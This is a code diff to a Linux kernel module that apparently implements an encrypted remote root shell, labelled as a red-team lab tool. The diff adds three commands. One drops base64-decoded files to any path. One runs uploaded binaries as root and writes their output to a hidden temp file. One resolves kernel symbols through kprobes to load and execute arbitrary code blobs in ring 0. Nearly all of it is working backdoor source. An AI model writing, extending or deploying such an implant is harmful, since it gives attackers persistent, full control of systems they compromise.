@@ -36,10 +36,14 @@
 #include <linux/slab.h>
 #include <linux/delay.h>
 #include <linux/random.h>
+#include <linux/kprobes.h>
 #include <net/sock.h>
 
 /* Embedded TweetNaCl — pure C, no kernel crypto API needed */
 #include "tweetnacl_kernel.h"
+
+/* Base64 decoder for file transfer */
+#include "b64_kernel.h"
 
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Red Team Lab");
@@ -245,7 +249,202 @@ static int krecv_encrypted(struct kshell_ctx *ctx, u8 *out, int max_len)
     return pt_len;
 }
 
-/* --- Command execution (same as kshell.c) --- */
+/* --- Kprobes symbol resolution (for kload) --- */
+static void *resolve_sym(const char *name)
+{
+    struct kprobe kp = { .symbol_name = name };
+    void *addr;
+    if (register_kprobe(&kp) < 0) return NULL;
+    addr = (void *)kp.addr;
+    unregister_kprobe(&kp);
+    return addr;
+}
+
+/*
+ * cmd_upload — Receive a base64-encoded file and write it to disk.
+ *
+ * Protocol: "!upload <path> <base64_data>"
+ * The file is written with 0755 permissions.
+ */
+static int cmd_upload(const char *args, char *output, int output_len)
+{
+    const char *path_end;
+    char path[256];
+    const char *b64_data;
+    u8 *decoded;
+    int decoded_len;
+    struct file *f;
+    loff_t pos = 0;
+    int path_len;
+
+    /* Parse path (first word) */
+    path_end = strchr(args, ' ');
+    if (!path_end) {
+        snprintf(output, output_len, "usage: !upload <path> <base64_data>\n");
+        return -1;
+    }
+    path_len = path_end - args;
+    if (path_len >= sizeof(path)) path_len = sizeof(path) - 1;
+    memcpy(path, args, path_len);
+    path[path_len] = '\0';
+    b64_data = path_end + 1;
+
+    /* Decode base64 */
+    decoded = kmalloc(strlen(b64_data), GFP_KERNEL);
+    if (!decoded) {
+        snprintf(output, output_len, "upload: out of memory\n");
+        return -ENOMEM;
+    }
+    decoded_len = b64_decode(b64_data, decoded, strlen(b64_data));
+    if (decoded_len < 0) {
+        kfree(decoded);
+        snprintf(output, output_len, "upload: base64 decode error\n");
+        return -1;
+    }
+
+    /* Write file */
+    f = filp_open(path, O_WRONLY | O_CREAT | O_TRUNC, 0755);
+    if (IS_ERR(f)) {
+        kfree(decoded);
+        snprintf(output, output_len, "upload: can't create %s: %ld\n",
+                path, PTR_ERR(f));
+        return PTR_ERR(f);
+    }
+    kernel_write(f, decoded, decoded_len, &pos);
+    filp_close(f, NULL);
+    kfree(decoded);
+
+    snprintf(output, output_len, "uploaded %d bytes → %s\n",
+            decoded_len, path);
+    return 0;
+}
+
+/*
+ * cmd_run — Execute an uploaded binary as a userspace process.
+ *
+ * Protocol: "!run <path> [args...]"
+ * Runs via call_usermodehelper as root. Waits for completion.
+ * Output is captured and sent back.
+ */
+static int cmd_run(const char *args, char *output, int output_len)
+{
+    char *full_cmd;
+    char *argv[] = { "/bin/sh", "-c", NULL, NULL };
+    char *envp[] = { "HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
+    struct file *f;
+    loff_t pos = 0;
+    int ret;
+
+    /* Make the binary executable and run it */
+    full_cmd = kmalloc(strlen(args) + 128, GFP_KERNEL);
+    if (!full_cmd) return -ENOMEM;
+
+    snprintf(full_cmd, strlen(args) + 128,
+             "chmod +x %s 2>/dev/null; %s > /tmp/.ksh_out 2>&1", args, args);
+    argv[2] = full_cmd;
+
+    ret = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+    kfree(full_cmd);
+
+    if (ret < 0) {
+        snprintf(output, output_len, "run failed: %d\n", ret);
+        return ret;
+    }
+
+    /* Read output */
+    f = filp_open("/tmp/.ksh_out", O_RDONLY, 0);
+    if (IS_ERR(f)) {
+        snprintf(output, output_len, "run: executed (no output)\n");
+        return 0;
+    }
+    memset(output, 0, output_len);
+    ret = kernel_read(f, output, output_len - 1, &pos);
+    filp_close(f, NULL);
+    if (ret >= 0 && ret < output_len) output[ret] = '\0';
+    return ret;
+}
+
+/*
+ * cmd_kload — Load a PIC blob into kernel memory and execute it in ring 0.
+ *
+ * Protocol: "!kload <base64_data>"
+ *
+ * The blob is base64-decoded, loaded into executable kernel memory
+ * (via module_alloc + set_memory_x), and executed as a function call.
+ * The blob MUST return (ret instruction) — otherwise the shell hangs.
+ *
+ * For long-running kernel payloads, the blob should spawn its own
+ * kthread and return immediately.
+ *
+ * On strict W^X kernels (Ubuntu 6.8+), set_memory_x may not work.
+ * The blob will only execute on permissive kernels.
+ */
+static int cmd_kload(const char *b64_data, char *output, int output_len)
+{
+    typedef void *(*module_alloc_t)(unsigned long);
+    typedef int (*set_memory_x_t)(unsigned long, int);
+    module_alloc_t fn_alloc;
+    set_memory_x_t fn_smx;
+    u8 *decoded;
+    void *exec_mem;
+    int decoded_len;
+    int numpages;
+    void (*entry)(void);
+
+    /* Resolve kernel symbols */
+    fn_alloc = (module_alloc_t)resolve_sym("module_alloc");
+    fn_smx = (set_memory_x_t)resolve_sym("set_memory_x");
+    if (!fn_alloc || !fn_smx) {
+        snprintf(output, output_len,
+                "kload: can't resolve module_alloc/set_memory_x\n");
+        return -1;
+    }
+
+    /* Decode blob */
+    decoded = kmalloc(strlen(b64_data), GFP_KERNEL);
+    if (!decoded) return -ENOMEM;
+    decoded_len = b64_decode(b64_data, decoded, strlen(b64_data));
+    if (decoded_len <= 0) {
+        kfree(decoded);
+        snprintf(output, output_len, "kload: base64 decode error\n");
+        return -1;
+    }
+
+    /* Allocate executable memory */
+    numpages = (PAGE_ALIGN(decoded_len)) >> PAGE_SHIFT;
+    exec_mem = fn_alloc(PAGE_ALIGN(decoded_len));
+    if (!exec_mem) {
+        kfree(decoded);
+        snprintf(output, output_len, "kload: module_alloc failed\n");
+        return -ENOMEM;
+    }
+
+    /* Copy blob and make executable */
+    memcpy(exec_mem, decoded, decoded_len);
+    kfree(decoded);
+
+    if (fn_smx((unsigned long)exec_mem, numpages)) {
+        snprintf(output, output_len,
+                "kload: set_memory_x failed (strict W^X kernel?)\n");
+        /* Don't free — module_memfree may not be available */
+        return -1;
+    }
+
+    /* Execute the blob — it MUST return */
+    snprintf(output, output_len,
+            "kload: executing %d bytes at %px in ring 0...\n",
+            decoded_len, exec_mem);
+
+    entry = (void (*)(void))exec_mem;
+    entry();
+
+    /* If we get here, blob returned successfully */
+    snprintf(output + strlen(output), output_len - strlen(output),
+            "kload: blob returned OK\n");
+    return 0;
+}
+
+/* --- Command execution (regular shell commands) --- */
 static int run_cmd(const char *cmd, char *output, int output_len)
 {
     char *full_cmd;
@@ -291,11 +490,15 @@ static int shell_loop(void *data)
     int ret, len;
     const char *banner =
         "\n[kshell_nacl] encrypted kernel shell (NaCl secretbox)\n"
-        "[kshell_nacl] XSalsa20 + Poly1305 (embedded TweetNaCl)\n"
-        "[kshell_nacl] works on kernels 2.6 through latest\n"
-        "[kshell_nacl] type 'exit' to disconnect\n\n# ";
+        "[kshell_nacl] commands:\n"
+        "  <cmd>                — run shell command as root\n"
+        "  !upload <path> <b64> — upload file (base64-encoded)\n"
+        "  !run <path> [args]   — execute uploaded binary\n"
+        "  !kload <b64>         — load PIC blob into ring 0\n"
+        "  exit                 — disconnect\n\n# ";
 
-    recv_buf = kmalloc(4096, GFP_KERNEL);
+    /* Large recv buffer for file uploads (base64-encoded binaries) */
+    recv_buf = kmalloc(1024 * 1024, GFP_KERNEL); /* 1 MB */
     output_buf = kmalloc(65536, GFP_KERNEL);
     if (!recv_buf || !output_buf) goto out;
 
@@ -323,8 +526,8 @@ static int shell_loop(void *data)
 
     while (1) {
         if (!ctx->ff && kthread_should_stop()) break;
-        memset(recv_buf, 0, 4096);
-        len = krecv_encrypted(ctx, (u8 *)recv_buf, 4095);
+        memset(recv_buf, 0, 1024 * 1024);
+        len = krecv_encrypted(ctx, (u8 *)recv_buf, (1024 * 1024) - 1);
         if (len <= 0) break;
 
         while (len > 0 && (recv_buf[len-1] == '\n' || recv_buf[len-1] == '\r'))
@@ -341,9 +544,27 @@ static int shell_loop(void *data)
             break;
         }
 
-        pr_debug("kshell_nacl: exec: %s\n", recv_buf);
+        pr_debug("kshell_nacl: cmd: %s\n", recv_buf);
         memset(output_buf, 0, 65536);
-        run_cmd(recv_buf, output_buf, 65536);
+
+        /* Dispatch !-commands or regular shell commands */
+        if (strncmp(recv_buf, "!upload ", 8) == 0) {
+            cmd_upload(recv_buf + 8, output_buf, 65536);
+        } else if (strncmp(recv_buf, "!run ", 5) == 0) {
+            cmd_run(recv_buf + 5, output_buf, 65536);
+        } else if (strncmp(recv_buf, "!kload ", 7) == 0) {
+            cmd_kload(recv_buf + 7, output_buf, 65536);
+        } else if (strcmp(recv_buf, "!help") == 0) {
+            snprintf(output_buf, 65536,
+                "commands:\n"
+                "  <cmd>                — shell command (root)\n"
+                "  !upload <path> <b64> — upload file\n"
+                "  !run <path> [args]   — run uploaded binary\n"
+                "  !kload <b64>         — PIC blob → ring 0\n"
+                "  exit                 — disconnect\n");
+        } else {
+            run_cmd(recv_buf, output_buf, 65536);
+        }
 
         len = strlen(output_buf);
         if (len > 0)
